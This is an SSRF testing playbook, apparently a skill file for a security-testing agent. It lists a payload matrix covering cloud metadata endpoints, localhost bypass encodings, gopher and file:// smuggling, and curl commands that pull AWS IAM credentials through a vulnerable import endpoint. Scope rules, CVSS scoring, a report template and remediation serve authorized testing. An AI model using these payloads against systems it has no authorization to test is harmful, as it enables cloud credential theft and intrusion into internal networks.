---
name: ssrf
description: 'Server-side request forgery testing for cloud metadata theft, internal service reach, and protocol smuggling, proven with an OOB listener. Triggers: SSRF, "server ကနေ request", metadata, "internal ရောက်", "ssrf စမ်း".'
category: vulnerabilities
track: 02-vuln-class
tags: [ssrf, metadata, cloud, internal, oob]
severity_ceiling: critical
requires: [oob-listener, baseline-http-capture]
tools: [interactsh-client, curl, ffuf]
cwe: CWE-918
owasp: [A01:2025, API7:2023]
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# Server-Side Request Forgery

## 1. Preconditions

- An OOB listener running (`interactsh-client`) and the generated callback domain noted.
- Candidate features: URL fetch, webhook config, image/PDF import, avatar-by-URL, RSS,
  link preview, XML/SOAP with external DTD, PDF renderer, screenshot service, SSO
  metadata import, file import from "cloud storage".
- Baseline capture of the same feature with a benign external URL you control.

## 2. Gate

Three cells; the third is the only one that proves server-side execution:

| Cell | URL supplied | Observed if SSRF |
|---|---|---|
| Control | `https://your-own-host/hit?c=ctrl` | your listener logs a hit |
| Negative | `https://127.0.0.1:1/` or `http://nonexistent.invalid/` | immediate error, no hit |
| Test | `http://<interactsh-domain>/hit?c=test` | **listener logs a hit from the server's IP** |

**Pass:** a DNS or HTTP interaction arrives from the target's infrastructure, not from
your machine. Record source IP and timestamp.

**Fail:** no interaction, and the negative cell behaves identically. A changed error
message alone is a lead, not a finding.

## 3. Enumeration

```bash
# find URL-taking parameters
ffuf -u 'https://app.example.com/api/FUZZ=https://example.org' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# start OOB listener first
interactsh-client -v
```

Parameter names that carry URLs: `url`, `uri`, `link`, `src`, `dest`, `redirect`,
`return`, `callback`, `webhook`, `feed`, `image`, `avatar`, `proxy`, `fetch`, `host`,
`domain`, `path`, `target`, `site`, `next`, `continue`, `share`, `import`.

Blind surfaces: XML parsers (see `xxe`), PDF generators, HTML-to-image services, office
document importers, Kubernetes webhook configs, Grafana data sources.

## 4. Test Matrix

| # | Payload | Purpose | Result signal |
|---|---|---|---|
| 1 | `http://<oob>/a` | basic server-side fetch | DNS + HTTP hit |
| 2 | `http://169.254.169.254/latest/meta-data/` | AWS IMDSv1 | 200 with instance data |
| 3 | `http://metadata.google.internal/computeMetadata/v1/` | GCP (needs header) | usually 403 unless header injectable |
| 4 | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure (needs `Metadata:true`) | |
| 5 | `http://[::ffff:169.254.169.254]/` | filter bypass | |
| 6 | `http://127.1/`, `http://2130706433/`, `http://0x7f000001/` | localhost bypass | |
| 7 | `http://127.0.0.1:6379/` + `gopher://` | protocol smuggling | banner / delay |
| 8 | `file:///etc/passwd` | local file read | body returned |
| 9 | `http://internal-service.local/` | internal DNS reach | body or timing |
| 10 | `https://<oob>/redirect?to=http://169.254.169.254/` | allowlist bypass via redirect | hit + metadata |

## 5. Proof

```bash
# 1. confirm server-side execution
interactsh-client -v        # in one terminal
curl -s 'https://app.example.com/api/import' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://<oob-domain>/ssrf-1"}'
# wait for the interaction, note the source IP

# 2. metadata read (AWS IMDSv1 example)
curl -s 'https://app.example.com/api/import' -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# then the role name
curl -s 'https://app.example.com/api/import' -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"}'
```

If credentials appear in the response: **stop**, do not use them, notify the client
immediately per the escalation path. Prove access with a read-only identity call only
if explicitly authorized.

Redirect-based allowlist bypass:

```bash
# host your own redirector that 302s to the metadata IP
curl -s 'https://app.example.com/fetch?url=https://your-host/r?to=http://169.254.169.254/'
```

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| My own browser fetched the URL, not the server | Listener source IP must be the target's egress, not yours |
| The app returned a cached page from a previous fetch | Use a unique path per attempt; cache-bust |
| A proxy in front fetched it | The interaction still proves server-side fetch; note the proxy IP |
| DNS-only hit but no HTTP | You proved DNS resolution — report as limited SSRF (DNS exfil), not full SSRF |
| The 200 came from a generic error page with a 200 status | Compare body to the negative cell |
| `169.254.169.254` blocked but a redirect works | That is a bypass with the same impact — report the bypass |

## 7. Impact

Escalate honestly:
- **DNS-only** → blind SSRF, exfil channel, internal port scan by timing.
- **HTTP fetch of internal service** → internal recon, possible auth-less admin APIs.
- **Metadata credentials** → cloud role takeover. Report as "cloud role credential
  exposure"; do not claim full account compromise unless you used the role.

## 8. CVSS 3.1

```text
Metadata credentials readable, unauthenticated:
  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N = 10.0 (Critical)
Internal service reach, no creds:      AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N = 7.7
DNS-only blind SSRF:                   AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N = 3.1
```

`S:C` only when you demonstrated crossing from the public app into the cloud control plane
or another security authority.

## 9. Report

```markdown
# SSRF in /api/import allows AWS IMDSv1 credential theft

**Severity:** Critical (CVSS 3.1: 10.0 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
**Affected asset:** app.example.com  POST /api/import  (body `url`)
**Category:** CWE-918 · OWASP A01:2025
```

Include the listener interaction log (with source IP) and the metadata response with
`AccessKeyId`, `SecretAccessKey`, `Token` **redacted**.

## 10. Remediation

- Do not fetch arbitrary URLs. If unavoidable:
  - Resolve the hostname, reject private/loopback/link-local ranges **after** resolution.
  - Re-check the resolved IP on **every** redirect hop (limit to 0–1 hops).
  - Allowlist destination hosts, not schemes.
  - Disable unused schemes (`file:`, `gopher:`, `dict:`, `ftp:`).
- Enforce IMDSv2 (`PUT` token required) so a plain GET cannot read credentials.
- Egress firewall from the app tier to `169.254.169.254` and internal ranges.
- Run fetchers in an isolated network namespace with no cloud role.

Regression test: `url=http://169.254.169.254/` and `url=http://127.0.0.1/` must be
rejected with 400 and no outbound connection.

## 11. References

- OWASP — Server Side Request Forgery Prevention Cheat Sheet
- CWE-918: Server-Side Request Forgery
- AWS — Configuring Instance Metadata Service (IMDSv2)
